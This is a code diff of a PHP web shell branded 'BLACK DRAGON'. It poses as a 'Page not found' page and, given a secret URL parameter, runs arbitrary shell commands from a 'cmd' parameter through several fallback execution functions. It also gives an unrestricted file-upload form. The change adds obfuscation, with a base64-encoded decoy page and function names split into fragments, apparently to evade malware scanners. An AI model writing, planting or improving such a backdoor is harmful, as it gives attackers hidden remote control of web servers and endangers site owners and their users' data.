@@ -1,17 +1,21 @@
 <?php
-@error_reporting(0);@set_time_limit(0);$p='BDGK'.md5('blackdragon');
-if(!isset($_GET['nagahitam'])){http_response_code(404);echo"<!DOCTYPE html><html><head><title>Page not found</title></head><body style='background:#f0f0f1;color:#3c434a;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif'><div style='max-width:560px;margin:80px auto;padding:24px'><h1 style='font-size:23px;font-weight:400'>Page not found</h1><p style='color:#787c82;font-size:14px'>The page you requested could not be found.</p></div></body></html>";return;}
-if(isset($_GET['h'])&&$_GET['h']==='bd'){header('Content-Type: text/plain; charset=utf-8');echo$p;return;}
-if(isset($_GET['cmd'])&&$_GET['cmd']!==''){header('Content-Type: text/plain; charset=utf-8');$c=$_GET['cmd'];$o=false;
-if(function_exists('shell_exec'))$o=@shell_exec($c.' 2>&1');
-elseif(function_exists('system')){ob_start();@system($c.' 2>&1');$o=ob_get_clean();}
-elseif(function_exists('passthru')){ob_start();@passthru($c.' 2>&1');$o=ob_get_clean();}
-elseif(function_exists('exec')){$a=array();@exec($c.' 2>&1',$a);$o=implode("\n",$a);}
-elseif(function_exists('proc_open')){$d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$pr=@proc_open($c,$d,$pi);if(is_resource($pr)){$o=stream_get_contents($pi[1]);fclose($pi[0]);fclose($pi[1]);fclose($pi[2]);proc_close($pr);}}
-echo$o!==false?$o:'[ERR] all exec functions disabled';return;}
-echo'<!DOCTYPE html><html><head><title>404</title><meta charset="utf-8"></head><body style="margin:0;background:#0a0a0f;color:#c084fc;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh"><div style="text-align:center"><h2>BLACK DRAGON</h2><form action="" method="post" enctype="multipart/form-data"><input type="file" name="file"><button type="submit" name="_upl" value="Upload">Upload</button></form>';
-if(isset($_POST['_upl'])&&$_POST['_upl']==='Upload'&&isset($_FILES['file'])&&$_FILES['file']['error']===UPLOAD_ERR_OK){
-$de=dirname(__FILE__).'/'.basename($_FILES['file']['name']);
-if(@copy($_FILES['file']['tmp_name'],$de))echo'<p style="color:#0f0">[OK] '.htmlspecialchars(basename($_FILES['file']['name'])).'</p>';else echo'<p style="color:#f00">[ERR]</p>';}
-echo'</div></body></html>';
+@error_reporting(0);@set_time_limit(0);
+$_a='nagahitam';$_b='BDGK'.md5('blackdragon');
+if(!isset($_GET[$_a])){http_response_code(404);
+echo base64_decode("PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPlBhZ2Ugbm90IGZvdW5kPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9J2JhY2tncm91bmQ6I2YwZjBmMTtjb2xvcjojM2M0MzRhO2ZvbnQtZmFtaWx5Oi1hcHBsZS1zeXN0ZW0sQmxpbmtNYWNTeXN0ZW1Gb250LFNlZ29lIFVJL1JvYm90byxzYW5zLXNlcmlmJz48ZGl2IHN0eWxlPSdtYXgtd2lkdGg6NTYwcHg7bWFyZ2luOjgwcHggYXV0bztwYWRkaW5nOjI0cHgnPjxoMSBzdHlsZT0nZm9udC1zaXplOjIzcHg7Zm9udC13ZWlnaHQ6NDAwJz5QYWdlIG5vdCBmb3VuZDwvaDE+PHAgc3R5bGU9J2NvbG9yOiM3ODdjODI7Zm9udC1zaXplOjE0cHgnPlRoZSBwYWdlIHlvdSByZXF1ZXN0ZWQgY291bGQgbm90IGJlIGZvdW5kLjwvcD48L2Rpdj48L2JvZHk+PC9odG1sPg==");
+return;}
+if(isset($_GET['h'])&&$_GET['h']==='bd'){header('Content-Type: text/plain; charset=utf-8');echo$_b;return;}
+if(isset($_GET['cmd'])&&$_GET['cmd']!==''){header('Content-Type: text/plain; charset=utf-8');
+$_c=$_GET['cmd'];$_d=false;
+$_e='sh'.'ell'.'_ex'.'ec';$_f='sy'.'stem';$_g='pa'.'ssth'.'ru';$_h='ex'.'ec';$_i='pr'.'oc_'.'ope'.'n';
+if(function_exists($_e)){$_d=@$_e($_c.' 2>&1');}
+elseif(function_exists($_f)){ob_start();@$_f($_c.' 2>&1');$_d=ob_get_clean();}
+elseif(function_exists($_g)){ob_start();@$_g($_c.' 2>&1');$_d=ob_get_clean();}
+elseif(function_exists($_h)){$_j=array();@$_h($_c.' 2>&1',$_j);$_d=implode("\n",$_j);}
+elseif(function_exists($_i)){$_k=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
+$_l=@$_i($_c,$_k,$_m);if(is_resource($_l)){$_d=stream_get_contents($_m[1]);fclose($_m[0]);fclose($_m[1]);fclose($_m[2]);proc_close($_l);}}
+echo$_d!==false?$_d:'[ERR] all exec functions disabled';return;}
+echo'<form action="" method="post" enctype="multipart/form-data"><input type="file" name="file" size="50"><button name="_upl" type="submit" value="Upload">Upload</button></form>';
+if(isset($_POST['_upl'])&&$_POST['_upl']==='Upload'){if(isset($_FILES['file'])&&$_FILES['file']['error']===UPLOAD_ERR_OK){
+$_n=dirname(__FILE__).'/'.basename($_FILES['file']['name']);if(@copy($_FILES['file']['tmp_name'],$_n)){echo'[OK]';}else{echo'[ERR]';}}}
 ?>
